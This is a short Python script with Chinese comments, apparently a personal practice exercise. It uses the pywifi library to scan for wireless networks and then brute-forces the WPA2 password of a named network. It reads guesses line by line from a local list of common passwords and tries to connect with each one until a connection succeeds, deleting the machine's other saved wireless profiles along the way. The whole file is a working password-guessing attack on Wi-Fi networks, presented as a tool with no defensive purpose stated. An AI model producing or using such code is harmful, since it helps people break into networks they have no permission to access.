#!/usr/bin/env python
# -*- encoding: UTF-8 -*- 
"""
-----------------------------------------------
#@File        : 练习.py
#@ide         : PyCharm
#@E-mail      : jxwhp@163.com
#@Author      : jxwhp
#@Modify time : 2020-04-19:17:20 
-----------------------------------------------
"""
#导入框架
import pywifi
#导入pywifi常量
from pywifi import const
import time

# 定义创建实例化的无线网络接口
def define_iface():
    #创建无线网络接口 实例化网络接口
    wifi = pywifi.PyWiFi()
    # 获取无线网卡
    iface = wifi.interfaces()[0]
    # 断开无线网卡
    iface.disconnect()
    return iface

#定义无线网络扫描接口
def scan_iface():
    #导入无线网络实例化模块
    iface = define_iface()
    # 启动扫描
    iface.scan()
    # 适应扫描时间
    time.sleep(2)
    # 扫描结果引用
    scan_results = iface.scan_results()
    # 输出扫描结果
    for i in scan_results:
        print(i.ssid,i.bssid)

# 定义匹配接口
def test_wifi(iface,pwd):
    #定义配置文件对象
    profile = pywifi.Profile()
    # 引用无线网络ID
    profile.ssid = '703'
    #profile.ssid = 'MaMiMaMiHong'
    # 引用无线网络密匙
    profile.key = pwd
    # 引用无线网络认证算法
        # 认证算法常量
        #AUTH_ALG_OPEN = 0  开放式
        #AUTH_ALG_SHARED = 1  共享式
    profile.auth = const.AUTH_ALG_OPEN
    # 引用无线网络加密算法
        # 加密算法常量
        #AKM_TYPE_NONE = 0  无
        #AKM_TYPE_WPA = 1   WPS
        #AKM_TYPE_WPAPSK = 2  WPAPSK
        #AKM_TYPE_WPA2 = 3  WPS2
        #AKM_TYPE_WPA2PSK = 4 WPA2SK
        #AKM_TYPE_UNKNOWN = 5
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    # 引用无线网络加密单元
        #CIPHER_TYPE_NONE = 0
        #CIPHER_TYPE_WEP = 1
        #CIPHER_TYPE_TKIP = 2
        #CIPHER_TYPE_CCMP = 3
        #CIPHER_TYPE_UNKNOWN = 4
    profile.cipher = const.CIPHER_TYPE_CCMP
    # 删除本机其它无线网络配置文件
    iface.remove_all_network_profiles()
    # 加载配置文件
    tem_profile = iface.add_network_profile(profile)
    # 按配置文件测试连接
    iface.connect(tem_profile)
    # 适应连接时间
    time.sleep(1)
    # 判断连接状态,并返回
        # 接口状态常量
            # IFACE_DISCONNECTED = 0
            # IFACE_SCANNING = 1
            # IFACE_INACTIVE = 2
            # IFACE_CONNECTING = 3
            # IFACE_CONNECTED = 4
    if iface.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False







def main():

    iface = define_iface()
    print('准备开始配对密匙......')
    path = r'D:/password/千万常用密码删减纯数字后.txt'
    file = open(path,'r')
    while True:
        pwd = file.readline()
        # 去掉行未的回车符
        pwd = pwd[:-1]
        bool = test_wifi(iface,pwd)
        if bool:
            print('已匹配到该无线网络的密码:{}'.format(pwd))
            print('正在连接该无线网络')
            print('已连接成功')
            break
        else:
            print('密码--({})--匹配不成功,自动导入下一个密码'.format(pwd))

if __name__ == "__main__":
    #scan_iface()
    main()